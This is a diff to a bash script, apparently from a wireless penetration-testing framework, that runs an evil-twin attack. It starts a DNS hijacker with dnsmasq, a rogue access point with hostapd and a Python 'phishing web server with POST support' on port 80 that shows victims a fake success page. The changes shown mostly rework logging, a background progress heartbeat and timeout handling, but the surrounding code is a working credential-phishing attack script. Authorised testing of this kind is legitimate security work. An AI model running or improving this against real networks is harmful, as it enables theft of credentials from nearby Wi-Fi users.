@@ -133,15 +133,37 @@ cleanup() {
     [[ -n "${HTTP_PID:-}" ]] && kill "$HTTP_PID" 2>/dev/null || true
     [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
     [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
+    [[ -n "${TEL_PID:-}" ]] && kill "$TEL_PID" 2>/dev/null || true
 }
 trap cleanup EXIT
 
+# Start dynamic telemetry heartbeat
+(
+    ELAPSED=0
+    while [[ $ELAPSED -lt $SCAN_TIME ]]; do
+        PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
+        STATUS="Portal active (waiting for users)... ($(( SCAN_TIME - ELAPSED ))s left)"
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
+        sleep 5
+        ((ELAPSED+=5))
+    done
+) &
+TEL_PID=$!
+
 echo -e "[*] Starting DNS hijacker..."
-dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    dnsmasq -C "$DNSMASQ_CONF" -k 2>&1 | tee "$DNSMASQ_LOG" &
+else
+    dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
+fi
 DNSMASQ_PID=$!
 
 echo -e "[*] Starting Rogue AP..."
-hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" &
+else
+    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
+fi
 HOSTAPD_PID=$!
 
 echo -e "[*] Starting phishing web server with POST support..."
@@ -160,29 +182,21 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b"<html><body><h1>Success</h1><p>Connection established. You may now close this window.</p></body></html>")
 
-socketserver.TCPServer(("", 80), Handler).serve_forever()
+try:
+    socketserver.TCPServer(("", 80), Handler).serve_forever()
+except Exception as e:
+    sys.stderr.write(f"Server error: {e}\n")
 EOF
 
-(
-    cd "$PHISH_DIR"
-    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-        python3 server.py 2>&1 | tee "$SERVER_LOG"
-    else
-        python3 server.py > "$SERVER_LOG" 2>&1
-    fi
-) &
-HTTP_PID=$!
-
-# 3. Progress Tracking
-ELAPSED=0
-while [[ $ELAPSED -lt $SCAN_TIME ]]; do
-    PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
-    STATUS="Portal active (waiting for users)... ($(( SCAN_TIME - ELAPSED ))s left)"
-    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
-    
-    sleep 5
-    ((ELAPSED+=5))
-done
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    # FOREGROUND
+    ( cd "$PHISH_DIR" && timeout "$SCAN_TIME" python3 server.py 2>&1 | tee "$SERVER_LOG" || true )
+else
+    # BACKGROUND
+    ( cd "$PHISH_DIR" && python3 server.py > "$SERVER_LOG" 2>&1 ) &
+    HTTP_PID=$!
+    sleep "$SCAN_TIME"
+fi
 
 cleanup
 trap - EXIT
